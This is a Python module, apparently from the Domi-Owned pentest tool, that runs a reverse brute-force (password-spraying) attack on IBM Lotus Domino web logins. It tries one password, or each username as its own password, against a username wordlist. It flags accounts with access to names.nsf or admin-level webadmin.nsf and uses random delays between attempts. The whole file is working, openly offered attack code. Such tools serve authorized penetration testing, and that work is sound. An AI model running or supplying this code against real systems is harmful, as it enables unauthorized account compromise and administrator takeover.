# Copyright (c) 2017, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import inflect
import os
import random
import sys
import tabulate
import time


from .main import DomiOwned


class BruteForce(DomiOwned):

	def bruteforce(self, userlist):
		"""
		Perform a reverse brute force attack with multiple usernames and one password.
		"""
		if self.auth_type == 'open':
			self.logger.info("{0}/names.nsf does not require authentication".format(self.url))
		else:
			usernames = self.build_userlist(userlist)
			valid_accounts = self.brute_accounts(usernames)

			print('\n')
			if valid_accounts:
				self.logger.info("Found {0} valid {1}".format(len(valid_accounts), inflect.engine().plural('account', len(valid_accounts))))
				print(tabulate.tabulate(valid_accounts, headers=['Username', 'Password', 'Account Type'], tablefmt='simple'))
			else:
				self.logger.warn('No valid accounts found')

	def build_userlist(self, userlist):
		"""
		Build a list of usernames from the user supplied wordlist.
		"""
		if os.path.isfile(userlist):
			f = open(os.path.abspath(userlist), 'r').read()
			usernames = f.rstrip().split('\n')
			return usernames
		else:
			self.logger.error('Unable to find username list')
			sys.exit()

	def brute_accounts(self, usernames):
		"""
		Determine if authentication was successful, and if the account is an administrator.
		"""
		valid_accounts = []

		# Setup progress bar
		progress_bar = self.utilities.setup_progress(len(usernames))

		# Check if username should be used as password
		if self.password == '':
			user_as_pass = True
		else:
			user_as_pass = False
			password_canidate = self.password

		for username in usernames:
			self.post_data = {}
			self.session.cookies.clear()

			# Set username as password
			if user_as_pass:
				password_canidate = username

			try:
				access = self.check_access(username=username, password=password_canidate)

				# Check for access to webadmin.nsf
				if access['webadmin.nsf']:
					valid_accounts.append([username, password_canidate, 'Admin'])

					# Administrator access > user access
					continue

				# Check for access to names.nsf
				if access['names.nsf']:
					valid_accounts.append([username, password_canidate, 'User'])

				progress_bar.update(1)
				time.sleep(random.random())

			except KeyboardInterrupt:
				self.logger.debug('Got Ctrl-C, exiting...')
				break

		progress_bar.close()

		return valid_accounts
